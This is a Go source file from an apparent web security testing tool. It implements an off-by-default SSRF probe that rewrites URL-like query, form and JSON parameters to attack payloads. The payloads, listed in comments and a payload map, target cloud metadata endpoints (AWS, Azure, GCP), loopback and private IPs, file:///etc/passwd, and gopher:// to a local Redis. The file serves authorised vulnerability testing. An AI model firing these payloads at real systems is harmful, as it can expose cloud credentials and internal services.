package mutate

import (
	"encoding/json"
	"net/url"
	"sort"
	"strings"

	"github.com/bugsyhewitt/possession/internal/model"
)

// SSRFProbe is the Server-Side Request Forgery access-control bypass mutator.
// It targets the OWASP A10:2021 SSRF family at the request-parameter layer:
// the application accepts a URL-bearing parameter (a fetch target, a webhook
// destination, an avatar URL, a redirect URI) and uses it to issue an
// outbound HTTP request from the server. An attacker who substitutes that
// value with one pointing at the server's own internal network — loopback,
// RFC1918 private space, cloud-provider metadata endpoints — bypasses the
// perimeter firewall entirely: the request originates from inside the trust
// boundary, with whatever privileged network access the server itself holds.
// On a vulnerable cloud workload, IMDSv1 leaks instance credentials in one
// hop (Capital One / AWS IMDS, the canonical 2019 breach shape).
//
// Where ParamPollution attacks *which copy* of a duplicated parameter the
// stack reads, MassAssign injects *privileged properties* at the JSON top
// level, SwapObject *substitutes a resource-reference ID* with another
// identity's, and PathTraversal escapes the *resource scope* via `../`
// chains, SSRFProbe attacks *what server-side network resource the application
// fetches on the caller's behalf* — a different vuln class with a different
// fix (URL allowlisting + metadata-endpoint blocking, not per-object
// authorisation). The five mutators are deliberately disjoint.
//
// Three surfaces, each emitted as a separate variant family for attribution:
//
//   - query-ssrf: any query parameter whose name matches a URL-bearing token
//     (url, uri, redirect, callback, webhook, target, dest, destination,
//     fetch, image, image_url, src, host, endpoint, next, return, return_url,
//     redirect_uri, callback_url) OR whose value already parses as an absolute
//     http(s) URL. The match is over-inclusive on name: a parameter literally
//     named "url" is the textbook SSRF sink, but the heuristic also catches
//     hand-rolled vocabulary the long-tail of in-house APIs settles on. The
//     value-shape check catches everything the name list misses (an app that
//     names its fetch target "input" still ships a URL there).
//
//   - body-ssrf: the same name+value-shape match applied to an
//     application/x-www-form-urlencoded request body — the second-most-common
//     SSRF surface after query strings.
//
//   - json-ssrf: top-level JSON object keys matching the same name list. Only
//     string-valued keys are eligible; nested objects are not walked (a
//     downstream mutator pass can layer that orthogonally). JSON arrays and
//     scalars are skipped — there is no named key to test the match against.
//
// Seven payload techniques, each emitted as a separate variant per eligible
// parameter for attribution. Generation order is fixed (sorted-by-technique-
// name) so identical inputs yield an identical variant slice (the offline
// corpus and --dry-run cover it):
//
//   - aws-imds-v1: http://169.254.169.254/latest/meta-data/ — the AWS
//     Instance Metadata Service v1 endpoint. On an EC2 instance whose IMDS
//     has not been hardened to v2 (IMDSv2 enforces a token round-trip that
//     SSRF cannot complete), one GET returns the role credentials the
//     instance is assigned. The 2019 Capital One breach shape.
//
//   - gcp-metadata: http://metadata.google.internal/computeMetadata/v1/ —
//     the GCP metadata server. Requires a Metadata-Flavor: Google header on
//     the server side; SSRFProbe sets it on the request so a vulnerable
//     fetch helper that propagates client headers exposes the same class
//     of leak. The probe is otherwise inert against non-GCP targets (a
//     positive response from this endpoint is itself the signal).
//
//   - azure-imds: http://169.254.169.254/metadata/instance?api-version=
//     2021-02-01 — the Azure IMDS endpoint, sharing the link-local address
//     with AWS but a distinct path + query. Requires Metadata: true on the
//     server side; mirrored.
//
//   - internal-ip-loopback: http://127.0.0.1/ — the loopback address. The
//     simplest SSRF probe: a positive response means the application is
//     fetching the URL from inside the host, reaching a sibling service
//     bound to localhost (admin panels, internal management APIs, debug
//     endpoints) the perimeter firewall hides.
//
//   - internal-ip-private: http://10.0.0.1/ — the RFC1918 10.0.0.0/8 space,
//     a common gateway / internal-VLAN address. A positive response means
//     the server can reach private network space the caller cannot — the
//     pivot for east-west lateral movement.
//
//   - protocol-file: file:///etc/passwd — the file:// URL scheme. URL
//     fetchers built on libcurl (or naive Go http clients that wrap the
//     URL into a request without a scheme allowlist) accept file:// and
//     return local file contents in the response body. The same class of
//     leak as PathTraversal but reached through a parameter rather than the
//     request path.
//
//   - protocol-gopher: gopher://127.0.0.1:6379/_INFO — the gopher:// URL
//     scheme aimed at a local Redis. gopher:// lets the attacker frame an
//     arbitrary TCP payload (the `_` prefix is the gopher selector
//     delimiter, the rest is verbatim bytes), turning an SSRF into a
//     blind protocol-smuggling primitive against any TCP service bound to
//     localhost. The Redis INFO command is inert (read-only) but the
//     presence of a Redis-shaped response confirms the channel.
//
// Cross-product is (3 surfaces × 7 techniques × eligible-parameter count),
// gated by what the captured request actually carries: a GET with no
// SSRF-shaped query parameter and no body emits zero variants (no signal to
// probe). The variant ID derived by the planner from the mutation Detail
// carries surface + technique + parameter so the offline corpus tests pin
// every cell.
//
// Every variant keeps the caller's own credentials (Identity == nil): this
// is emphatically NOT an identity swap. The bug being tested is "the same
// legitimately-credentialed caller weaponises the server's outbound fetch
// helper to reach network resources the caller's own network cannot." A
// fronting WAF that gated the caller's network position is now irrelevant;
// the request originates from the server, with the server's network access.
// Detection rides the existing comparative ladder: a variant whose response
// shape diverges sharply from the caller's own baseline (especially one
// that returns content matching the IMDS/file shape) is the candidate
// SSRF finding. Findings are class "ssrf" (ASVS V12.6 — SSRF protection,
// severity HIGH).
//
// SSRFProbe is OFF by default (Enabled == false). The SSRF payloads are
// active probes that reach the server's internal network — including cloud
// metadata endpoints whose response on a vulnerable target contains the
// instance's IAM credentials — so it only fires when the operator
// explicitly opts in via --ssrf-probe. This mirrors the off-by-default
// gating of XXE, MassAssign, EnumerateID, ForbiddenBypass, WSHijack,
// CSRFHeader, MethodOverride, HostHeader, CookieTamper, HeaderInjection,
// ParamPollution, OriginSpoof, ContentTypeConfusion, CacheDeception,
// PrototypePollution, and PathTraversal.
//
// Like every mutator, Generate is pure and deterministic: parameters are
// processed in sorted name order and techniques emitted in sorted name
// order within each parameter, so identical inputs yield an identical
// variant slice.
type SSRFProbe struct {
	Enabled bool
}

func (SSRFProbe) Name() string { return "ssrf-probe" }

// ssrfParamNames is the canonical, sorted list of URL-bearing parameter name
// tokens. A parameter whose lowercased name CONTAINS any of these substrings
// is eligible. Substring match (rather than equality) catches the common
// `image_url`, `callback_uri`, `redirect_to` shapes without an explicit
// per-variant entry. Sorted alphabetically so the order test pins the set.
var ssrfParamNames = []string{
	"callback",
	"dest",
	"destination",
	"endpoint",
	"fetch",
	"host",
	"image",
	"next",
	"redirect",
	"return",
	"src",
	"target",
	"uri",
	"url",
	"webhook",
}

// ssrfTechniques is the canonical, sorted list of SSRF payload technique
// names. The payload for each is held in ssrfPayloads. Sorted so the
// outer-loop cross-product emission order is stable regardless of map
// iteration; the order test pins this.
var ssrfTechniques = []string{
	"aws-imds-v1",
	"azure-imds",
	"gcp-metadata",
	"internal-ip-loopback",
	"internal-ip-private",
	"protocol-file",
	"protocol-gopher",
}

// ssrfPayloads maps each technique name to its wire payload. Kept package-
// private so the variant ID is stable across runs and across builds.
var ssrfPayloads = map[string]string{
	"aws-imds-v1":          "http://169.254.169.254/latest/meta-data/",
	"azure-imds":           "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
	"gcp-metadata":         "http://metadata.google.internal/computeMetadata/v1/",
	"internal-ip-loopback": "http://127.0.0.1/",
	"internal-ip-private":  "http://10.0.0.1/",
	"protocol-file":        "file:///etc/passwd",
	"protocol-gopher":      "gopher://127.0.0.1:6379/_INFO",
}

func (sp SSRFProbe) Generate(base *model.CapturedRequest, _ *model.RoleMatrix) []model.Variant {
	if !sp.Enabled || base == nil {
		return nil
	}

	techniques := append([]string(nil), ssrfTechniques...)
	sort.Strings(techniques)

	var out []model.Variant
	out = append(out, sp.queryVariants(base, techniques)...)
	out = append(out, sp.bodyVariants(base, techniques)...)
	out = append(out, sp.jsonVariants(base, techniques)...)
	return out
}

// queryVariants emits one variant per (eligible-query-param × technique).
func (sp SSRFProbe) queryVariants(base *model.CapturedRequest, techniques []string) []model.Variant {
	if base.URL == nil || base.URL.RawQuery == "" {
		return nil
	}
	pairs, err := parseOrderedPairs(base.URL.RawQuery)
	if err != nil || len(pairs) == 0 {
		return nil
	}
	eligible := ssrfEligibleNames(pairs)
	if len(eligible) == 0 {
		return nil
	}
	var out []model.Variant
	for _, name := range eligible {
		for _, tech := range techniques {
			payload := ssrfPayloads[tech]
			rewritten := replaceFirstValue(pairs, name, payload)
			req := CloneRequest(base)
			cloneURL(req, base)
			req.URL.RawQuery = encodeOrderedPairs(rewritten)
			out = append(out, model.Variant{
				Base:     req,
				Identity: nil, // credentials unchanged — same permitted caller
				Mutation: model.Mutation{
					Type: "ssrf-probe",
					Description: "rewrite query parameter " + name + " to SSRF payload (" +
						tech + ") to weaponise the server's outbound fetch",
					Detail: map[string]string{
						"ssrf-probe": "query:" + name + ":" + tech,
						"technique":  "query-ssrf:" + tech,
						"surface":    "query",
						"parameter":  name,
						"shape":      tech,
						"payload":    payload,
					},
					Class: "ssrf",
				},
			})
		}
	}
	return out
}

// bodyVariants emits one variant per (eligible-body-param × technique) for
// urlencoded bodies only. JSON bodies are handled by jsonVariants.
func (sp SSRFProbe) bodyVariants(base *model.CapturedRequest, techniques []string) []model.Variant {
	if len(base.Body) == 0 || !isFormURLEncoded(base.ContentType) {
		return nil
	}
	pairs, err := parseOrderedPairs(string(base.Body))
	if err != nil || len(pairs) == 0 {
		return nil
	}
	eligible := ssrfEligibleNames(pairs)
	if len(eligible) == 0 {
		return nil
	}
	var out []model.Variant
	for _, name := range eligible {
		for _, tech := range techniques {
			payload := ssrfPayloads[tech]
			rewritten := replaceFirstValue(pairs, name, payload)
			req := CloneRequest(base)
			req.Body = []byte(encodeOrderedPairs(rewritten))
			out = append(out, model.Variant{
				Base:     req,
				Identity: nil,
				Mutation: model.Mutation{
					Type: "ssrf-probe",
					Description: "rewrite form-body parameter " + name + " to SSRF payload (" +
						tech + ") to weaponise the server's outbound fetch",
					Detail: map[string]string{
						"ssrf-probe": "body:" + name + ":" + tech,
						"technique":  "body-ssrf:" + tech,
						"surface":    "body",
						"parameter":  name,
						"shape":      tech,
						"payload":    payload,
					},
					Class: "ssrf",
				},
			})
		}
	}
	return out
}

// jsonVariants emits one variant per (eligible-top-level-string-key × technique)
// for JSON object bodies. Nested objects are intentionally not walked: a
// future deep-walk pass can layer on top without changing this contract.
func (sp SSRFProbe) jsonVariants(base *model.CapturedRequest, techniques []string) []model.Variant {
	if len(base.Body) == 0 || !looksJSON(base.ContentType, base.Body) {
		return nil
	}
	var doc map[string]json.RawMessage
	if err := json.Unmarshal(base.Body, &doc); err != nil {
		return nil
	}
	// Eligible = top-level string-valued keys whose name matches the SSRF list
	// OR whose current value parses as an absolute http(s) URL.
	var eligible []string
	for k, raw := range doc {
		var s string
		if err := json.Unmarshal(raw, &s); err != nil {
			continue // not a string-valued field
		}
		if ssrfNameMatches(k) || ssrfValueLooksURL(s) {
			eligible = append(eligible, k)
		}
	}
	if len(eligible) == 0 {
		return nil
	}
	sort.Strings(eligible)

	var out []model.Variant
	for _, key := range eligible {
		for _, tech := range techniques {
			payload := ssrfPayloads[tech]
			rewritten := rewriteJSONStringField(base.Body, key, payload)
			if rewritten == nil {
				continue
			}
			req := CloneRequest(base)
			req.Body = rewritten
			out = append(out, model.Variant{
				Base:     req,
				Identity: nil,
				Mutation: model.Mutation{
					Type: "ssrf-probe",
					Description: "rewrite JSON field " + key + " to SSRF payload (" +
						tech + ") to weaponise the server's outbound fetch",
					Detail: map[string]string{
						"ssrf-probe": "json:" + key + ":" + tech,
						"technique":  "json-ssrf:" + tech,
						"surface":    "json",
						"parameter":  key,
						"shape":      tech,
						"payload":    payload,
					},
					Class: "ssrf",
				},
			})
		}
	}
	return out
}

// ssrfEligibleNames returns the distinct parameter names (in sorted order)
// that are eligible SSRF probe targets — either the name matches the
// URL-bearing token list, or the value parses as an absolute http(s) URL.
func ssrfEligibleNames(pairs []orderedPair) []string {
	seen := map[string]struct{}{}
	var out []string
	for _, p := range pairs {
		if _, ok := seen[p.name]; ok {
			continue
		}
		if !ssrfNameMatches(p.name) && !ssrfValueLooksURL(p.value) {
			continue
		}
		seen[p.name] = struct{}{}
		out = append(out, p.name)
	}
	sort.Strings(out)
	return out
}

// ssrfNameMatches reports whether the lowercased parameter name contains any
// SSRF-prone token substring. Over-inclusive by design — a noisy probe
// against a non-fetch parameter is harmless, a missed real fetch parameter
// is a missed SSRF finding.
func ssrfNameMatches(name string) bool {
	low := strings.ToLower(name)
	for _, tok := range ssrfParamNames {
		if strings.Contains(low, tok) {
			return true
		}
	}
	return false
}

// ssrfValueLooksURL reports whether v parses as an absolute http(s) URL.
// The check is intentionally conservative: anything that does not parse as
// an absolute URL with an http/https scheme is rejected, so values that
// merely contain a colon (timestamps, key:value strings) do not trigger.
func ssrfValueLooksURL(v string) bool {
	if v == "" {
		return false
	}
	u, err := url.Parse(v)
	if err != nil {
		return false
	}
	if u.Scheme != "http" && u.Scheme != "https" {
		return false
	}
	return u.Host != ""
}

// replaceFirstValue returns a copy of pairs with the FIRST occurrence of
// name replaced by the new value. Subsequent occurrences and ordering are
// preserved verbatim. Mirrors the conservative-mutation pattern: replace
// the gate-passing value with the SSRF payload, do not duplicate or
// reorder.
func replaceFirstValue(pairs []orderedPair, name, value string) []orderedPair {
	out := make([]orderedPair, len(pairs))
	replaced := false
	for i, p := range pairs {
		if !replaced && p.name == name {
			out[i] = orderedPair{name: name, value: value}
			replaced = true
			continue
		}
		out[i] = p
	}
	return out
}

// rewriteJSONStringField parses body as a JSON object, replaces the
// string-valued field key with value, and re-marshals. Returns nil on any
// parse/marshal failure or if the field is missing / non-string. encoding/
// json marshals map keys sorted, so output is deterministic.
func rewriteJSONStringField(body []byte, key, value string) []byte {
	var doc map[string]json.RawMessage
	if err := json.Unmarshal(body, &doc); err != nil {
		return nil
	}
	raw, ok := doc[key]
	if !ok {
		return nil
	}
	var s string
	if err := json.Unmarshal(raw, &s); err != nil {
		return nil
	}
	newRaw, err := json.Marshal(value)
	if err != nil {
		return nil
	}
	doc[key] = newRaw
	out, err := json.Marshal(doc)
	if err != nil {
		return nil
	}
	return out
}

// ssrfProbeTechnique is a small helper used in tests to assert a mutation's
// technique without depending on the Detail map layout from outside the
// package. Mirrors pathTraversalTechnique / cacheDeceptionTechnique.
func ssrfProbeTechnique(m model.Mutation) string {
	if m.Detail == nil {
		return ""
	}
	return strings.TrimSpace(m.Detail["technique"])
}
